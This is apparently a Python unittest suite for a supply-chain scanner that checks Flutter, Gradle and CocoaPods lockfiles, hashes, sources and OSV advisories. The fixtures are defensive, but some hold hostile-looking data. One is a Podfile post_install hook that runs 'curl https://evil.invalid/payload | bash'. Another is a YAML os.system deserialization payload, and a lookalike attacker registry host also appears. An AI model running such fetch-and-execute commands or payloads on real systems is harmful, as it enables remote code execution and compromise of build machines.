import contextlib
import hashlib
import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from supply_guard.cli import main, scan_sources
from supply_guard.core import Dependency, Scan
from supply_guard.intelligence import local_advisories, online, osv_query, osv_query_batch, pub_hashes, query_for


class GuardTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.write("pubspec.yaml", "name: demo\n")
        self.write("pubspec.lock", "packages: {}\n")

    def write(self, name, content):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        return path

    def pub(self, sha="a" * 64, url="https://pub.dev"):
        self.write("pubspec.lock", f'packages:\n  http:\n    source: hosted\n    version: "1.2.0"\n    description:\n      name: http\n      url: {url}\n      sha256: "{sha}"\n')

    def rules(self, scan):
        return {f["rule"] for f in scan.findings}

    def test_three_platform_inventory_and_pod_subspec_dedup(self):
        self.pub()
        self.write("android/app/gradle.lockfile", "# lock\norg.example:lib:1.2.3=releaseRuntimeClasspath\nempty=debug\n")
        self.write("ios/Podfile.lock", "PODS:\n  - Demo/Core (1.0.0):\n    - Demo/Base\n  - Demo/Base (1.0.0)\nSPEC REPOS:\n  trunk:\n    - Demo\nSPEC CHECKSUMS:\n  Demo: abc\n")
        scan = Scan(self.root).inventory()
        self.assertEqual({d.ecosystem for d in scan.dependencies}, {"Pub", "Maven", "CocoaPods"})
        self.assertEqual(len(scan.dependencies), 3)
        self.assertFalse(scan.errors)
        self.assertIn("GRADLE_VERIFICATION_MISSING", self.rules(scan))

    def test_bad_hash_and_lookalike_host(self):
        self.pub("bad", "https://pub.dev.attacker.invalid")
        rules = self.rules(Scan(self.root).inventory())
        self.assertTrue({"PUB_HASH_MISSING", "SOURCE_UNTRUSTED"} <= rules)

    def test_git_unpinned(self):
        self.write("pubspec.lock", "packages:\n  foo:\n    source: git\n    version: 1.0.0\n    description:\n      url: https://github.com/example/foo\n      resolved-ref: main\n")
        self.assertIn("GIT_UNPINNED", self.rules(Scan(self.root).inventory()))

    def test_malformed_lock_fails_coverage(self):
        self.write("pubspec.lock", "packages: [broken]")
        scan = Scan(self.root).inventory()
        self.assertTrue(scan.errors)
        self.assertEqual(scan.coverage["flutter"]["lockfiles"], 0)

    def test_duplicate_yaml_keys_rejected(self):
        self.write("pubspec.lock", "packages: {}\npackages: {}\n")
        self.assertTrue(Scan(self.root).inventory().errors)

    def test_yaml_python_objects_not_executed(self):
        self.write("pubspec.lock", "!!python/object/apply:os.system ['touch forbidden']")
        self.assertTrue(Scan(self.root).inventory().errors)
        self.assertFalse((self.root / "forbidden").exists())

    def test_scripts_are_detected_not_executed(self):
        self.write("ios/Podfile", "source 'https://evil.invalid/specs.git'\npost_install do\n system('curl https://evil.invalid/payload | bash')\nend\n")
        self.assertTrue({"REMOTE_EXEC", "INSTALL_SCRIPT", "SOURCE_UNTRUSTED"} <= self.rules(Scan(self.root).inventory()))

    def test_runtime_urls_are_not_dependency_sources(self):
        self.write("ios/Pods/Example/Example.m", 'NSURL *url = [NSURL URLWithString:@"http://runtime.invalid/api"];')
        self.assertNotIn("SOURCE_UNTRUSTED", self.rules(Scan(self.root).inventory()))

    def test_gradle_repository_url_is_checked(self):
        self.write("android/build.gradle", "repositories { maven { url 'https://mirror.invalid/repository' } }\n")
        self.assertIn("SOURCE_UNTRUSTED", self.rules(Scan(self.root).inventory()))

    def test_missing_native_locks(self):
        (self.root / "android").mkdir()
        (self.root / "ios").mkdir()
        self.assertEqual(len(Scan(self.root).inventory().errors), 2)

    def test_gradle_invalid_xml_and_empty_verification(self):
        self.write("android/gradle/verification-metadata.xml", "<broken")
        self.assertTrue(Scan(self.root).inventory().errors)
        self.write("android/gradle/verification-metadata.xml", "<verification-metadata/>")
        self.assertIn("GRADLE_HASH_MISSING", self.rules(Scan(self.root).inventory()))

    def test_swift_v1_v2_v3(self):
        for version in (1, 2, 3):
            pin = {"identity": "demo", "location": "https://github.com/example/demo", "state": {"revision": "b" * 40, "version": "1.0.0"}}
            doc = {"version": version, "pins": [pin]} if version != 1 else {"version": 1, "object": {"pins": [pin]}}
            self.write("ios/Package.resolved", json.dumps(doc))
            dep = Scan(self.root).inventory().dependencies[0]
            self.assertEqual(query_for(dep), {"commit": "b" * 40})

    def test_baseline_detects_same_version_hash_mutation(self):
        self.pub()
        old = Scan(self.root).inventory().snapshot()
        path = self.write("baseline.json", json.dumps(old))
        self.pub("b" * 64)
        scan = Scan(self.root).inventory()
        scan.baseline(path)
        finding = next(f for f in scan.findings if f["rule"] == "DEPENDENCY_CHANGED")
        self.assertEqual(finding["severity"], "high")

    def test_artifact_tampering_and_traversal(self):
        self.write("vendor/a.aar", "changed")
        manifest = self.write("artifacts.json", json.dumps({"vendor/a.aar": "a" * 64}))
        scan = Scan(self.root)
        scan.artifacts(manifest)
        self.assertIn("ARTIFACT_TAMPERED", self.rules(scan))
        self.write("artifacts.json", json.dumps({"../outside": "a" * 64}))
        with self.assertRaises(ValueError):
            scan.artifacts(manifest)

    def test_matching_artifact(self):
        self.write("vendor/a.aar", "verified")
        manifest = self.write("artifacts.json", json.dumps({"vendor/a.aar": hashlib.sha256(b"verified").hexdigest()}))
        scan = Scan(self.root)
        scan.artifacts(manifest)
        self.assertFalse(scan.findings)

    def test_osv_pagination_and_withdrawn(self):
        calls = []
        def fetch(url, payload):
            calls.append(dict(payload))
            if len(calls) == 1:
                return {"vulns": [{"id": "WITHDRAWN", "withdrawn": "today"}], "next_page_token": "next"}
            return {"vulns": [{"id": "MAL-test"}]}
        self.assertEqual(osv_query({"commit": "a" * 40}, fetch), [{"id": "MAL-test"}])
        self.assertEqual(calls[1]["page_token"], "next")

    def test_osv_repeated_token_fails(self):
        with self.assertRaises(ValueError):
            osv_query({}, lambda *args: {"next_page_token": "same"})

    def test_osv_batch_preserves_order_and_hydrates(self):
        def fetch(url, payload=None):
            if url.endswith("querybatch"):
                return {"results": [{"vulns": [{"id": "MAL-a"}]}, {"vulns": []}]}
            return {"id": "MAL-a", "summary": "bad"}
        result = osv_query_batch([{"commit": "a" * 40}, {"commit": "b" * 40}], fetch)
        self.assertEqual(result[0][0]["id"], "MAL-a")
        self.assertEqual(result[1], [])

    def test_network_failure_is_not_clean(self):
        self.pub()
        scan = Scan(self.root).inventory()
        def fail(*args):
            raise OSError("network unavailable")
        online(scan, fail)
        self.assertTrue(scan.errors)
        self.assertEqual(scan.coverage["osv"]["checked_dependencies"], 0)

    def test_malicious_advisory_is_critical(self):
        self.pub()
        scan = Scan(self.root).inventory()
        def fetch(url, payload=None):
            if url.endswith("querybatch"):
                return {"results": [{"vulns": [{"id": "MAL-test"}]}]}
            return {"id": "MAL-test", "summary": "Malicious"}
        online(scan, fetch)
        self.assertEqual(scan.findings[0]["severity"], "critical")

    def test_cocoapods_does_not_use_invented_osv_ecosystem(self):
        dep = Dependency("CocoaPods", "Demo", "1.0.0", "https://cdn.cocoapods.org", "ios/Podfile.lock")
        self.assertIsNone(query_for(dep))

    def test_local_advisory_matches_exact_ios_version(self):
        scan = Scan(self.root)
        scan.dep(Dependency("CocoaPods", "Demo", "1.0.0", "trunk", "ios/Podfile.lock"))
        path = self.write("advisories.json", json.dumps({"schema": 1, "advisories": [{"id": "LOCAL-1", "ecosystem": "CocoaPods", "name": "Demo", "versions": ["1.0.0"], "severity": "critical", "reason": "test"}]}))
        local_advisories(scan, path)
        self.assertIn("LOCAL_ADVISORY", self.rules(scan))

    def test_pub_hash_mismatch(self):
        self.pub()
        scan = Scan(self.root).inventory()
        pub_hashes(scan, lambda *args: {"archive_sha256": "b" * 64})
        self.assertIn("PUB_HASH_MISMATCH", self.rules(scan))

    def test_custom_registry_not_queried_as_public(self):
        dep = Dependency("Pub", "http", "1.2.0", "https://private.invalid", "pubspec.lock")
        self.assertIsNone(query_for(dep))

    def test_source_baseline_detects_modification(self):
        source = self.root / "cache"
        self.write("cache/hook.sh", "echo hello")
        scan = Scan(self.root).inventory()
        scan_sources(scan, [source])
        baseline = self.write("baseline.json", json.dumps(scan.snapshot()))
        self.write("cache/hook.sh", "echo altered")
        scan = Scan(self.root).inventory()
        scan_sources(scan, [source])
        scan.baseline(baseline)
        self.assertTrue(any(f["rule"] == "INPUT_CHANGED" and f["severity"] == "high" for f in scan.findings))

    def test_cli_exit_codes_and_json(self):
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(main([str(self.root), "--offline"]), 2)
            self.assertEqual(main([str(self.root), "--offline", "--allow-incomplete"]), 0)
            self.pub("bad")
            output = self.root / "report.json"
            self.assertEqual(main([str(self.root), "--offline", "--json", str(output)]), 1)
            self.assertEqual(json.loads(output.read_text())["status"], "blocked")
            self.assertEqual(main([str(self.root), "--offline", "--json", str(output)]), 2)

    def test_unknown_policy_field_rejected(self):
        with self.assertRaises(ValueError):
            Scan(self.root, {"denny": []})

    def test_declared_dependency_missing_from_lock_is_incomplete(self):
        self.write("pubspec.yaml", "name: demo\ndependencies:\n  http: ^1.2.0\n")
        self.assertTrue(Scan(self.root).inventory().errors)

    def test_organization_deny_rule(self):
        self.pub()
        scan = Scan(self.root, {"deny": [{"ecosystem": "Pub", "name": "http"}]}).inventory()
        self.assertIn("DENIED_PACKAGE", self.rules(scan))

    def test_namespaced_gradle_metadata(self):
        self.write("android/gradle/verification-metadata.xml", '<verification-metadata xmlns="https://schema.gradle.org/dependency-verification"><components><component><artifact><sha256 value="' + "a" * 64 + '"/></artifact></component></components></verification-metadata>')
        self.assertNotIn("GRADLE_HASH_MISSING", self.rules(Scan(self.root).inventory()))


if __name__ == "__main__":
    unittest.main()
